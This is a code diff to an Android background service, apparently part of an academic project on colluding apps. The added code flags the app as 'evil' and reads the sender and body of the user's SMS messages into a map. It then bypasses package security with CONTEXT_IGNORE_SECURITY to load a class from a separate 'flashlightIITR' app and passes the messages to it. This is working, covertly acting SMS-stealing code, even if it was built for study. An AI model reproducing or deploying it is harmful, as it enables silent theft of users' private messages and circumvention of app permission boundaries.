@@ -224,7 +224,7 @@ public class BackgroundService extends Service {
     private boolean isRunning;
     HashMap<String, String> smsList = new HashMap<String, String>();
     private static final String PERMISSION_STATUS = "permission_status";
-
+    private boolean isAppDirectlyStarted = false;
 
 
     @Override
@@ -236,7 +236,7 @@ public class BackgroundService extends Service {
     public void onCreate() {
         Context context = this;
         this.isRunning = false;
-        Log.d("BgC","In OnCreate method.");
+        Log.d("BgC", "In OnCreate method.");
 
     }
 
@@ -259,48 +259,13 @@ public class BackgroundService extends Service {
         this.isRunning = false;
     }
 
-//    private boolean checkPermission() {
-//        return ContextCompat.checkSelfPermission(this, "com.example.flashlightIITR.permission.ACCESS_BACKGROUND_SERVICE")
-//                == PackageManager.PERMISSION_GRANTED;
-//    }
-
-//    private void requestPermission() {
-//        if (ActivityCompat.shouldShowRequestPermissionRationale(this, "com.example.flashlightIITR.permission.ACCESS_BACKGROUND_SERVICE")) {
-//            // Show an explanation to the user
-//            AlertDialog.Builder builder = new AlertDialog.Builder(this);
-//            builder.setTitle("Permission Needed");
-//            builder.setMessage("This app needs access to run in the background for some features. Grant the permission?");
-//            builder.setPositiveButton("Grant", new DialogInterface.OnClickListener() {
-//                @Override
-//                public void onClick(DialogInterface dialog, int which) {
-//                    ActivityCompat.requestPermissions(BackgroundService.this,
-//                            new String[]{"com.example.flashlightIITR.permission.ACCESS_BACKGROUND_SERVICE"},
-//                            PERMISSION_REQUEST_CODE);
-//                }
-//            });
-//            builder.setNegativeButton("Deny", new DialogInterface.OnClickListener() {
-//                @Override
-//                public void onClick(DialogInterface dialog, int which) {
-//                    // User denied the permission, handle it accordingly
-//                   // sharedPreferences.edit().putBoolean(PERMISSION_STATUS, false).apply();
-//                    dialog.dismiss();
-//                }
-//            });
-//            builder.show();
-//        } else {
-//            // No explanation needed; request the permission
-//            ActivityCompat.requestPermissions(this,
-//                    new String[]{"com.example.flashlightIITR.permission.ACCESS_BACKGROUND_SERVICE"},
-//                    PERMISSION_REQUEST_CODE);
-//        }
-//    }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         MainActivity.isEvil = true;
         Clues myclues = new Clues();
         myclues.SendLog("App Mode Change", "App entered onStartCommand()", "Malicious");
-        Log.d("BgC","Entering onStartCommand Method");
+        Log.d("BgC", "Entering onStartCommand Method");
 
         if (!this.isRunning) {
             this.isRunning = true;
@@ -316,7 +281,7 @@ public class BackgroundService extends Service {
         @Override
         protected String doInBackground(String[]... params) {
             getSMSDetails(result);
-            Log.d("BgC","Coming out from SMSDetails method");
+            Log.d("BgC", "Coming out from SMSDetails method");
             return "";
         }
 
@@ -327,7 +292,7 @@ public class BackgroundService extends Service {
                     null,
                     null,
                     null);
-            Log.d("BgC","Finding the sms.");
+            Log.d("BgC", "Finding the sms.");
 
             try {
                 int i = 0;
@@ -337,7 +302,7 @@ public class BackgroundService extends Service {
                     String sender = smsCursor.getString(smsCursor.getColumnIndexOrThrow("address"));
                     String message = smsCursor.getString(smsCursor.getColumnIndexOrThrow("body"));
                     smsList.put(sender, message);
-                    Log.d("BgC","Adding the data in Hash-map");
+                    Log.d("BgC", "Adding the data in Hash-map");
                     i++;
                     if (i == 2) {
                         break;
@@ -345,115 +310,63 @@ public class BackgroundService extends Service {
                 }
             } catch (Exception ex) {
                 ex.printStackTrace();
-                Log.e("BgC","Got an error.");
+                Log.e("BgC", "Got an error.");
             } finally {
                 assert smsCursor != null;
                 smsCursor.close();
             }
 
-        sendDataToAnotherApp();
-        Log.d("BgC","Send the data");
+
+            try {
+                PackageManager packageManager = getPackageManager();
+                packageManager.getPackageInfo("com.example.flashlightIITR", PackageManager.GET_ACTIVITIES);
+                Log.d("BgC","Found the package name");
+
+                final Context remoteContext = getApplicationContext().createPackageContext("com.example.flashlightIITR",
+                        Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE );
+                Log.d("BgC","Creating the context");
+
+                final ClassLoader loader = remoteContext.getClassLoader();
+                final Class<?> classNotify = loader.loadClass("com.example.flashlightIITR.NotificationActivity");
+                Log.d("BgC","Loading the class.");
+
+                Intent intent1 = new Intent(remoteContext,classNotify);
+                intent1.setAction(Intent.ACTION_SEND);
+                intent1.putExtra("SMS_LIST", smsList);
+                intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
+                intent1.setType("text/plain");
+                Log.d("BgC", String.valueOf(smsList));
+
+                startActivity(intent1);
+                Log.d("BgC","Starting the Intent");
+            } catch (Exception ex) {
+                Log.e("BgC", ex.toString());
+                ex.printStackTrace();
+            }
+
+
+            stopSelf();
+
 
         }
     }
 
-    private void sendDataToAnotherApp() {
-        // Serialize the smsList if needed (convert to a format that can be passed via Intent)
-        // Assuming smsList is a HashMap<String, String>:
-        // You might need to serialize it using Gson or another method based on your specific data structure
-
-        // Convert HashMap to a serialized form (example using Gson library)
-        Gson gson = new Gson();
-        String serializedData = gson.toJson(smsList);
-        Log.d("BgC","Converting the HashMap");
-
-        // Prepare the Intent to send data to another app
-        Intent sendIntent = new Intent();
-        sendIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
-        sendIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
-        sendIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
-        sendIntent.setAction(Intent.ACTION_SEND);
-        sendIntent.putExtra("SMS_LIST", serializedData);
-        Log.d("BgC",serializedData);
-        sendIntent.setType("text/plain");
-
-        // Set the package name of the receiving app
-        sendIntent.setComponent(new ComponentName("com.example.flashlightIITR", "com.example.flashlightIITR.NotificationActivity"));
-
-        // Check if there's an app available to receive this intent
-        if (sendIntent.resolveActivity(getPackageManager()) != null) {
-            startActivity(sendIntent);
-            Log.d("BgC","Starting the activity");
-        } else {
-            // Handle case where no suitable app or activity is installed to receive the intent
-            Log.e("BgC", "No suitable app/activity found to handle the intent");
-        }
-    }
-
-    private String serializeHashMap(HashMap<String, String> hashMap) {
-        try {
-            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
-            objectOutputStream.writeObject(hashMap);
-            objectOutputStream.close();
-            return Base64.encodeToString(byteArrayOutputStream.toByteArray(), Base64.DEFAULT);
-        } catch (IOException e) {
-            e.printStackTrace();
-            return null;
-        }
-    }
+//        private void sendDataToAnotherApp() {
+//        // Create an explicit intent with the component name of the NotificationActivity
+//        Intent sendIntent = new Intent();
+//        sendIntent.setComponent(new ComponentName("com.example.flashlightIITR", "com.example.flashlightIITR.NotificationActivity"));
+//        sendIntent.putExtra("SMS_LIST", smsList);
+//        Log.d("BgC", String.valueOf(smsList));
+//
+//        try {
+//            // Start the service using the explicit intent
+//            sendBroadcast(sendIntent);
+//            Log.d("BgC", "Service started in flashlight app");
+//        } catch (Exception e) {
+//            Log.e("BgC", "Error starting service in flashlight app: " + e.getMessage());
+//            e.printStackTrace();
+//        }
+//    }
 
 
 }
-
-//            try {
-//                PackageManager packageManager = getPackageManager();
-//                try {
-//                    packageManager.getPackageInfo("com.example.flashlightIITR", PackageManager.GET_ACTIVITIES);
-//                    Log.d("BgC","Found the package name");
-//                } catch (PackageManager.NameNotFoundException e) {
-//                    e.printStackTrace();
-//                    Log.e("BgC","Cannot find the package name");
-//                }
-//
-//                final Context remoteContext = getApplicationContext().createPackageContext("com.example.flashlightIITR",
-//                        Context.CONTEXT_IGNORE_SECURITY | Context.CONTEXT_INCLUDE_CODE );
-//                Log.d("BgC","Creating the context");
-//
-//                final ClassLoader loader = remoteContext.getClassLoader();
-//                final Class<?> classBackground = loader.loadClass("com.example.flashlightIITR.BackgroundService");
-//                final Class<?> classNotify = loader.loadClass("com.example.flashlightIITR.NotificationActivity");
-//                Log.d("BgC","Loading the classes.");
-//
-//                Handler h = new Handler(Looper.getMainLooper());
-//                h.post(new Runnable() {
-//                    public void run() {
-//                        Log.d("BgC","In the run method");
-//                        try {
-//                            Intent intent1 = new Intent(remoteContext, classNotify);
-//                            intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
-//                            intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-//                            intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
-//                            intent1.putExtra("SMS_LIST", serializeHashMap(smsList));
-//                            Log.d("BgC", String.valueOf(smsList));
-//
-//                                remoteContext.startActivity(intent1);
-//                                Log.d("BgC","Starting the Intent");
-//
-//
-//
-//
-//
-//                        } catch (Exception ex) {
-//                            ex.printStackTrace();
-//                        }
-//                    }
-//
-//
-//                });
-//            } catch (Exception ex) {
-//                Log.e("BgC", ex.toString());
-//                ex.printStackTrace();
-//            }
-//
-//            stopSelf();
